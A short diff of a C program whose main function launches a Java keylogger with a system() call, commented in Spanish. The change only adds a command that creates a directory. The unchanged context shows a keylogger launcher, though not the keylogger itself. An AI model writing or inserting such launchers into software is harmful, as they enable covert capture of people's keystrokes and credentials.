@@ -25,5 +25,7 @@ int main(int argc, char const *argv[])
     //Ejecutamos el KeyLogger creado en java 
     system("java -jar KeyLogger.jar");
 
+	system("mkdir Cilclista");
+
     return 0x0;
 }
